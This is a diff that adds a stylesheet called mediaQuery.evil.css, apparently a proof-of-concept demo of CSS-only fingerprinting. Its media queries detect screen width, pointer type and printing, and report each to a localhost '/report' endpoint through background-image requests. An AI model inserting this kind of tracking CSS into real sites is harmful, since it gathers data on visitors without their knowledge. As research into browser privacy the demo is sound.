@@ -1,0 +1,67 @@
+body::before {
+    content: "You loaded mediaQuery.evil.css!";
+    position: fixed;
+    top: 0;
+    left: 0;
+    font-size: 12px;
+    font-family: "Courier New", serif;
+    background-color: rgba(255, 12, 82, 0.75);
+    width: 100%;
+    text-align: center;
+    color: white;
+    z-index: 999;
+}
+
+/* Get device resolution */
+@media all and (min-width: 1919px) {
+    body {
+        background-image: url("http://localhost:3000/report?site=mediaQuery&type=windowsize&payload=1920");
+    }
+}
+
+@media all and (min-width: 1439px) and (max-width: 1919px) {
+    body {
+        background-image: url("http://localhost:3000/report?site=mediaQuery&type=windowsize&payload=1440");
+    }
+}
+
+@media all and (min-width: 1365px) and (max-width: 1439px) {
+    body {
+        background-image: url("http://localhost:3000/report?site=mediaQuery&type=windowsize&payload=1366");
+    }
+}
+
+@media all and (min-width: 374px) and (max-width: 376px) {
+    body {
+        background-image: url("http://localhost:3000/report?site=mediaQuery&type=windowsize&payload=375");
+    }
+}
+
+@media all and (min-width: 359px) and (max-width: 361px) {
+    body {
+        background-image: url("http://localhost:3000/report?site=mediaQuery&type=windowsize&payload=360");
+    }
+}
+
+/* Get device type: mobile phone, PC */
+@media all and (any-pointer: fine) {
+    body:after {
+        content: "";
+        background-image: url("http://localhost:3000/report?site=mediaQuery&type=pointer&payload=fine");
+    }
+}
+
+@media all and (any-pointer: coarse) {
+    body:after {
+        content: "";
+        background-image: url("http://localhost:3000/report?site=mediaQuery&type=pointer&payload=coarse");
+    }
+}
+
+/* if user print this page */
+@media print {
+    html {
+        background-image: url("http://localhost:3000/report?site=mediaQuery&type=print&payload=print_action");
+    }
+}
+
